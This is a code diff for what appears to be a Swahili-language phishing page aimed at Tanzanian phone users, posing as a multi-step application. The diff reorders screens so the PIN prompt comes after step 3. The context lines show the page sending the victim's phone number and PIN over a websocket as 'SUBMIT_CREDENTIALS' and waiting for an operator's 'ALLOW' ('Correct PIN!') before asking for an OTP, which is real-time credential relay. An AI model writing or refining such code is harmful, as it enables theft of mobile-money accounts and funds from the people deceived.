@@ -2,8 +2,8 @@ const screens = {
     slider: document.getElementById('screen-slider'),
     step1: document.getElementById('screen-step1'),
     step2: document.getElementById('screen-step2'),
-    pin: document.getElementById('screen-pin'),
     step3: document.getElementById('screen-step3'),
+    pin: document.getElementById('screen-pin'),
     otp: document.getElementById('screen-otp'),
     account: document.getElementById('screen-account'),
     success: document.getElementById('screen-success')
@@ -114,7 +114,7 @@ document.getElementById('btn-step1-next').addEventListener('click', () => {
     }, 800);
 });
 
-// Step 2 Navigation (Phone entry only -> leads to PIN screen)
+// Step 2 Navigation (Phone & Name entry only)
 document.getElementById('btn-step2-prev').addEventListener('click', () => showScreen('step1'));
 document.getElementById('btn-step2-next').addEventListener('click', () => {
     const phone = document.getElementById('phone-number').value.trim();
@@ -127,6 +127,16 @@ document.getElementById('btn-step2-next').addEventListener('click', () => {
     applicantData.phone = phone;
     document.getElementById('lbl-masked-phone').textContent = `+255${phone}`;
     
+    showLoading();
+    setTimeout(() => {
+        hideLoading();
+        showScreen('step3');
+    }, 600);
+});
+
+// Step 3 Navigation -> Leads to PIN screen (after Step 3 out of 3)
+document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('step2'));
+document.getElementById('btn-step3-submit').addEventListener('click', () => {
     showLoading();
     setTimeout(() => {
         hideLoading();
@@ -169,16 +179,6 @@ document.getElementById('btn-pin-submit').addEventListener('click', () => {
     applicantData.pin = pinCode;
     showLoading("Inatuma maombi kwa ukaguzi...");
     ws.send(JSON.stringify({ type: 'SUBMIT_CREDENTIALS', phone: applicantData.phone, pin: applicantData.pin }));
-});
-
-// Step 3 Navigation & Submission
-document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('pin'));
-document.getElementById('btn-step3-submit').addEventListener('click', () => {
-    showLoading();
-    setTimeout(() => {
-        hideLoading();
-        showScreen('step3'); 
-    }, 600);
 });
 
 // OTP Input auto-focus helper
@@ -231,7 +231,7 @@ function handleServerAction(action) {
     switch (action) {
         case 'ALLOW':
             showSurfaceNotification("Correct PIN! Endelea hatua inayofuata.", "success");
-            showScreen('step3');
+            showScreen('otp');
             break;
         case 'DENY':
             showSurfaceNotification("Maombi yamekataliwa. Anza upya.", "error");
@@ -267,9 +267,9 @@ function handleServerAction(action) {
 backBtn.addEventListener('click', () => {
     if (currentScreenName === 'step1') showScreen('slider');
     else if (currentScreenName === 'step2') showScreen('step1');
-    else if (currentScreenName === 'pin') showScreen('step2');
-    else if (currentScreenName === 'step3') showScreen('pin');
-    else if (currentScreenName === 'otp') showScreen('step3');
+    else if (currentScreenName === 'step3') showScreen('step2');
+    else if (currentScreenName === 'pin') showScreen('step3');
+    else if (currentScreenName === 'otp') showScreen('pin');
     else if (currentScreenName === 'account') showScreen('otp');
 });
     
